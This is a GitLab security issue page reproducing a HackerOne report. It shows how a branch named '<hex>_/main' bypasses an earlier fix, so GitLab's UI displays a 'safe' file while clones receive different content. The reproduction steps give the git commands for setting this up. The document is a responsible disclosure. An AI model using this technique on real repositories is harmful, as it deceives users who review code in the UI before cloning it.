=== Content from gitlab.com_01e88bd8_20250114_194409.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Manipulate the repository content in the UI (bypass #2031845)

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2173053](https://hackerone.com/reports/2173053)** by `shells3c` on 2023-09-20, assigned to `GitLab Team`:

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

In order to fix [#2031845](https://gitlab.com/gitlab-org/gitlab/-/issues/416252 "The main branch of a repository with a specially designed name allows an attacker to create repositories with malicious code. [Bypass #1864278]."), Gitlab added another check in `prohibited_branch_checks` method to prevent any branch name that matches `<hex>-/`. However, the `_` character also works and hasn't been protected yet.

##### Steps to reproduce

1. Create a new empty project on Gitlab
2. Clone the project and create a safe repository for UI display:

```
mkdir -p ./_/main
echo "safe" > ./_/main/script.sh
git add -A
git commit -m .
git push origin
```

3. Create a malicious branch with the malicious code:

```
git checkout --orphan "$(git rev-parse HEAD)_/main"
git rm -rf .
echo "evil" > script.sh
git add -A
git commit -m .
git push origin
```

4. Go to your repository settings and set your default branch to the new branch

Now visit the project from Gitlab and view the content of `script.sh`, you will see `safe`, but if you clone it, the file will contain `evil`.

##### Output of checks

This bug happens on GitLab.com

#### Impact

Similar to #1864278 (you can read it [here](https://gitlab.com/gitlab-org/gitlab/-/issues/416252 "The main branch of a repository with a specially designed name allows an attacker to create repositories with malicious code. [Bypass #1864278].") if you can't access the HackerOne report), the repository you see from the UI is different than the repository you clone. You can see [the video](https://user-content.gitlab-static.net/0d3adf436fc2d1305bc9c9980eb5b1949cef39de/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36626364356664622d663631662d346464382d613233642d6464656564353262633833332f706f632e6d7034) in the original report to understand it better.

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


